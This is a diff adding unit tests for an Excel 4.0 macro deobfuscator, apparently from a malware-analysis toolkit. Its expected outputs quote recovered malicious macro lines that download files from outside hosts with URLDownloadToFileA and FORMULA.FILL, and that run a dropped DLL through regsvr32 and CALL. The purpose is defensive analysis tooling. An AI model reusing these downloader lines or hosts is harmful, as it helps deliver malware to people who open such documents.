@@ -3,8 +3,9 @@ from __future__ import annotations
 import random
 
 from refinery.lib.excel import synthesize_formula
+from refinery.lib.excel.formula.model import XlFunctionCall
 from refinery.lib.scripts.xlm import XlmEngine, XlmView
-from refinery.lib.scripts.xlm.deobfuscation import deobfuscate, sweep
+from refinery.lib.scripts.xlm.deobfuscation import deobfuscate, fold, sweep
 from refinery.lib.scripts.xlm.model import XlmCell
 from test import TestBase
 from test.lib.excel.samples import (
@@ -14,14 +15,33 @@ from test.lib.excel.samples import (
     XLM_MACRO_RPN_BIFF8,
     XLM_MACRO_TEXT_XLSM,
 )
-from test.lib.scripts.xlm.modify import drop_defined_names
+from test.lib.scripts.xlm.modify import (
+    drop_defined_names,
+    replace_cell_element,
+    replace_cell_formula,
+)
 
 _MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'
+
+
+def _replaced(*replacements: tuple[str, str], data: bytes = XLM_MACRO_TEXT_XLSM) -> bytes:
+    for cell, formula in replacements:
+        data = replace_cell_formula(data, cell, formula)
+    return data
 
 
 def _cells(view: XlmView) -> set[tuple[str, int, int]]:
     return {
         (macrosheet.name, cell.row, cell.col)
+        for macrosheet in view.macrosheets()
+        for cell in macrosheet.body
+        if isinstance(cell, XlmCell)
+    }
+
+
+def _values(view: XlmView) -> dict[tuple[str, int, int], object]:
+    return {
+        (macrosheet.name, cell.row, cell.col): cell.value
         for macrosheet in view.macrosheets()
         for cell in macrosheet.body
         if isinstance(cell, XlmCell)
@@ -42,6 +62,16 @@ def _listing(view: XlmView) -> dict[tuple[str, int, int], str]:
         for cell in macrosheet.body
         if isinstance(cell, XlmCell) and cell.formula is not None
     }
+
+
+def _calls(view: XlmView, sheet: str, row: int, col: int, name: str) -> list[str]:
+    cell = view.cell(sheet, row, col)
+    assert cell is not None and cell.formula is not None
+    return [
+        synthesize_formula(node)
+        for node in cell.formula.walk_in_order()
+        if isinstance(node, XlFunctionCall) and node.callee == name
+    ]
 
 
 class TestDeadCellSweep(TestBase):
@@ -91,6 +121,32 @@ class TestDeadCellSweep(TestBase):
     def test_without_a_start_point_or_a_name_the_unreferenced_cells_go(self):
         nameless = drop_defined_names(XLM_MACRO_TEXT_XLSM)
         self.assertEqual(len(_cells(self._sweeped(nameless))), 27)
+
+    def test_a_cell_only_a_text_address_names_survives_the_sweep(self):
+        halting = replace_cell_element(
+            XLM_MACRO_TEXT_XLSM,
+            'BH120',
+            '<c r="BH120"><f>HALT()</f></c>',
+        )
+        data = _replaced(('AZ109', 'GOTO("R120C60")'), data=halting)
+        self.assertEqual(
+            _trace(self._sweeped(data)),
+            [
+                ('Doc1', 109, 52, 'FullEvaluation', 'GOTO("R120C60")'),
+                ('Doc1', 120, 60, 'End', 'HALT()'),
+            ],
+        )
+
+    def test_a_cell_between_the_corners_of_a_range_survives_the_sweep(self):
+        valued = replace_cell_element(
+            XLM_MACRO_TEXT_XLSM,
+            'BH120',
+            '<c r="BH120" t="str"><v>x</v></c>',
+        )
+        data = _replaced(('AZ109', 'SET.VALUE(BD108,COUNTA(BG120:BI120))'), data=valued)
+        swept = _trace(self._sweeped(data))
+        self.assertEqual(swept[0], ('Doc1', 109, 52, 'FullEvaluation', 'SET.VALUE(BD108,2)'))
+        self.assertEqual(swept, _trace(XlmView(data)))
 
     def test_the_maldoc_listing_shrinks_without_touching_its_trace(self):
         data = self.download_sample(_MALDOC)
@@ -166,3 +222,72 @@ class TestConstantFolding(TestBase):
             listing[('Tiposa1', 22, 7)],
             'EXEC("regsvr32  C:\\ProgramData\\Ropedjo1.ocx")',
         )
+
+    def test_a_cell_the_program_writes_stays_a_reference_in_the_listing(self):
+        listing = _listing(self._deobfuscated(XLM_MACRO_TEXT_XLSM))
+        self.assertEqual(
+            listing[('Doc1', 93, 56)],
+            r'CALL(BD108&"n",BD109&"A",BD119,Doc2!AR84,Doc1!BD113,"..\iekdhfe.dsk1",0,0)',
+        )
+
+    def test_a_read_of_cells_no_write_reaches_folds_into_their_text(self):
+        self.assertEqual(
+            _calls(self._deobfuscated(XLM_MACRO_TEXT_XLSM), 'Doc1', 112, 52, 'FORMULA.FILL'),
+            ['FORMULA.FILL("https://ieclb.com.br/ds/3103.gif",Doc1!BD112)'],
+        )
+
+    def test_a_read_of_a_cell_a_write_reaches_does_not_fold(self):
+        data = _replaced(('AZ109', 'SET.VALUE(BJ116,"changed")'))
+        self.assertEqual(
+            _calls(self._deobfuscated(data), 'Doc1', 112, 52, 'FORMULA.FILL'),
+            ['FORMULA.FILL(Doc2!AP94&Doc1!BI116&Doc1!BJ116&Doc2!AS94,Doc1!BD112)'],
+        )
+
+    def test_a_write_inside_a_formula_the_program_enters_reaches_its_cell(self):
+        data = _replaced(('AZ109', 'FORMULA("=SET.VALUE(BJ116,""changed"")",BD130)'))
+        self.assertEqual(
+            _calls(self._deobfuscated(data), 'Doc1', 112, 52, 'FORMULA.FILL'),
+            ['FORMULA.FILL(Doc2!AP94&Doc1!BI116&Doc1!BJ116&Doc2!AS94,Doc1!BD112)'],
+        )
+
+    def test_a_formula_cell_of_a_worksheet_folds_into_the_text_a_macro_enters(self):
+        self.assertEqual(
+            _calls(self._deobfuscated(XLM_MACRO_FORMULA_XLSM), 'PCWV', 8, 7, 'FORMULA')[0],
+            'FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCBB"",0,'
+            r'""http://buchhave.net/cache/t82rF5S/"",""..\rfs.dll"",0,0)",G13)',
+        )
+
+    def test_folding_changes_no_value_the_workbook_stores(self):
+        data = _replaced(
+            ('AZ110', 'LEN(INDIRECT("AZ118"))'),
+            ('AZ118', 'FORMULA("overwritten",BF109)'),
+        )
+        view = XlmView(data)
+        stored = _values(view)
+        fold(view)
+        self.assertEqual(_values(view), stored)
+        self.assertEqual(_listing(view)[('Doc1', 110, 52)], 'LEN(INDIRECT("AZ118"))')
+
+    def test_a_folded_value_keeps_its_type(self):
+        data = _replaced(
+            ('AZ109', 'SET.VALUE(BD108,"00"&amp;"7")'),
+            ('AZ110', 'SET.VALUE(BD109,1&gt;0)'),
+            ('AZ118', 'SET.VALUE(BD119,1/0)'),
+            ('AZ120', 'SET.VALUE(BD121,"#N/"&amp;"A")'),
+        )
+        listing = _listing(self._deobfuscated(data))
+        self.assertEqual(
+            [listing['Doc1', row, 52] for row in (109, 110, 118, 120)],
+            [
+                'SET.VALUE(BD108,"007")',
+                'SET.VALUE(BD109,TRUE)',
+                'SET.VALUE(BD119,#DIV/0!)',
+                'SET.VALUE(BD121,"#N/A")',
+            ],
+        )
+
+    def test_a_formula_deeper_than_the_interpreter_stack_folds(self):
+        letters = [chr(65 + index % 26) for index in range(1200)]
+        chain = '&amp;'.join(F'CHAR({ord(letter)})' for letter in letters)
+        listing = _listing(self._deobfuscated(_replaced(('AZ109', F'SET.VALUE(BD108,{chain})'))))
+        self.assertEqual(listing['Doc1', 109, 52], F'SET.VALUE(BD108,"{"".join(letters)}")')
